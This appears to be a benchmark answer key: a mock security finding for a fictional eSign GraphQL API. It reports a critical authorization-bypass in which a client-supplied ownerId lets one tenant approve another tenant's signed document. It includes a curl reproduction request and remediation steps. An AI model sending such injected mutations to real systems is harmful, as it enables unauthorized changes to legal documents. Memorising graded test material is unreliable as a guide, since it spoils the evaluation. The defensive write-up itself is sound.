# Expected Response

## System
- Domain: Document Signing / eSign
- System: SignFlow eSign Platform
- Example ID: GQL-0147

## Priority Findings

### Finding 1: eSign Platform — Authorization-Bypass Injection via updateResource (Pattern 5.1)
**Severity:** Critical
**Category:** Injection / Authorization-Bypass Injection

**Summary:**
Per §5.0 (Pattern 5.1 — authorization-bypass injection): The `updateResource` mutation accepts a client-supplied `ownerId` field that is used to determine authorization. An attacker from `tenant-f03a` submitted `updateResource(id: "R-2147", input: {status: "approved", ownerId: "attacker-f03ae845"})` against a signed document belonging to `tenant-e845`, bypassing ownership checks and gaining cross-tenant write access including `CONFIDENTIAL-f03ae845`. In Document Signing, this enables unauthorized approval/modification of legally binding contracts and agreements.

**Evidence from HAR:**
- Request: `POST https://api.signflow-esign-platf.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-f03a`
- Mutation: `updateResource(id: "R-2147", input: {status: "approved", ownerId: "attacker-f03ae845"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-e845"`, `ownerId: "other-user-f03ae845"`, `sensitiveField: "CONFIDENTIAL-f03ae845"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-f03ae845`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 5.1 | Authorization-bypass injection via input |
| HAR request | input.ownerId | attacker-f03ae845 (client-injected) |
| HAR response | tenantId | Cross-tenant eSign doc tenant-e845 |
| HAR response | sensitiveField | CONFIDENTIAL-f03ae845 |

## Steps to Reproduce

### Step 1 — updateResource with injected ownerId (HAR)
```bash
curl -s -X POST https://api.signflow-esign-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-f03a" \
  -d '{"query": "mutation { updateResource(id: \"R-2147\", input: {status: \"approved\", ownerId: \"attacker-f03ae845\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-e845` legal document approved. **Secure:** FORBIDDEN.

## Remediation
1. Strip `ownerId` from `ResourceInput`; set from `$jwt.userId` server-side.
2. Resolver: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Signature state machine must validate signing party identity from JWT, never from input.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
